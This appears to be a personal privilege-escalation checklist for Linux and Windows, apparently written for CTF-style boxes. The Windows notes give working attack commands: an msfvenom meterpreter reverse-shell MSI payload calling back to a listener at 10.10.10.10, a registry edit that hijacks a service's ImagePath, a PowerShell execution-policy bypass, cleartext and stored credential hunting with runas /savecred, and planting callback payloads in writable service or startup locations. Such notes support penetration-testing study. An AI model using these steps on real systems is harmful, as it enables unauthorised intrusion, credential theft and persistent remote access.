- [ ] when ```www-data``` shell is obtained upload a linenum scripts and run it
- [ ] look for <br />
        1. Files with unwanted permissions <br />
        2. Files with SETUID binaries ```find / -perm -4000``` <br />
        3. Look for Cron Jobs <br />
- [ ] always look for the users in the ```/home``` dirs, the passwords that found during the enumeartion phase will be the same password for the user as well
- [ ] ```sudo -l``` should be checked must
- [ ] Make a note of all password yoiu come accross the way to the shell and try ```su - <user>``` and try each passwords
- [ ] Keep an eye on the ```groups``` that the user belongs to
- [ ] After gaining the shell look for `network activity` of the machine
- [ ] While running the enumeration scripts, look for the network activities
- [ ] When Binaries execute, `strace <binary>` strace it and look for the things it executes `exec`


#### Windows
### Windows PrivEsc

- [ ] once you get the revershell, look for `current user` and `system informations`
- [ ] Look for open vulns with `kbid` with the command `wmic qfc` 
> WE CANT EXPECT IT TO WORK ON ALL BOXES
- [ ] Check for password files stored in clear text, `findstr /si password *.txt *.ini *.config *.xml`
- [ ] Always look for `unattended.xml` for passwords leak
- [ ] Upload files for testing in the `temp` directory `C:\\temp\\`
- [ ] Look for things in registry with `reg query` 
- [ ] Look for auto login from the `registry` which enumerates username
- [ ] When you see internal services running and not shown in nmap scan, better to do port forwarding
- [ ] If WSL is available in the machine, look for related vulnerabilities
- [ ] Look at the priviledges available for the user `whoami /priv`, if `SeImpersonatePriviledge` is enabled use it
- [ ] Look for alternate data streams when the specified file is not found `dir /R` and look the contents of the alternate data streams with `more < $FILE_NAME`
- [ ] Check for `runas` commands when a low level shell is obtained
> RUNAS ALLOWS US TO RUN APPLICATIONS AS ANOTHER USER
- [ ] Look for stored credentilas in the machine `cmdkey /list`
- [ ] If the credentials for the particular user is enumerated via cmdkey /list, execute all commands as that specific user with `runas.exe /user:domainName\userName /savecred "<command to execute>"`
- [ ] Check for `autorun` progs and look for ways if it can be leveraged `accesschk64.exe -wvu <path>`
- [ ] Check for `autorun` progs with `PowerUp.ps1`, if any file found with all access (read,write for everybody) generate a payload and replace it in its folder with the same name which wil run and obtain us a reverse shell
- [ ] Check for `always install packages` as elevated
- [ ] Check for full control over a `registry key` which allows to install malicious 
- [ ] Check for files that execute and have write access
- [ ] Check for startup-application are vulnerables
- [ ] Check for processes with `powersploit`


##### Notes
```bash
- [ ] Check for `autorun` progs and look for ways if it can be leveraged `accesschk64.exe -wvu <path>`
- [ ] Check for `autorun` progs with `PowerUp.ps1`, if any file found with all access (read,write for everybody) generate a payload and replace it in its folder with the same name which wil run and obtain us a reverse shell
# start powershell from cmd with execution policy bypass mode
powershell -ep bypass
# start the PowerUP.ps1
. .\PowerUp.ps1
# Get the all items
Invole-AllChecks 
```

```bash
- [ ] Check for `always install packages` as elevated
# check for auto install elevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
# Always install elevated value = 1 in both the commands
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# generate a msfvenom msi payload and install it
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=4444 -f msi -o setup.msi
# elevate from the output of PowerUp.ps1, it shows the command
Write-UserAddMSI
# install it and obtain a new user in the administrators group
```

```bash
- [ ] Check for full control over a `registry key` which allows to install malicious 
# get the access control list of the registry regsvc
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# windows_service.c is used for service hijacking
# adding the malicious executable to the registry 
# save the entry with the name(valuename)(/v) ImagePath(reg key that contains the path of the drivers image files ) and runthe string(/t = mentions the type, REG_EXAPND_SZ - tells we are going to run a string here) that follows which is a data(/d) and execute the file, dont show any confirmations(/f)
reg add HKML\System\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
# start the registry service
sc start regsvc
```


```bash
- [ ] Check for files that execute and have write access
# like finding binaries with write access 'like in traceback machine'
#running the PowerUp.ps1 we can find the same under the `Checking Service Executables adn argument permissions`
# over write the malicious(generated with msfvenom) exe with the exe that is found with write permissions
# start over the application which is running as service with the command, `sc start <service_name>`
```

```bash
- [ ] Check for startup-application are vulnerables
# check the startup applications
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startp"
# if full access is available, makesure to create a malicious program which call backs home and place it in the startup folder(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startp)
# when logged out and logged in, as the startup program kicks in, the reverse shell will be obtained
```
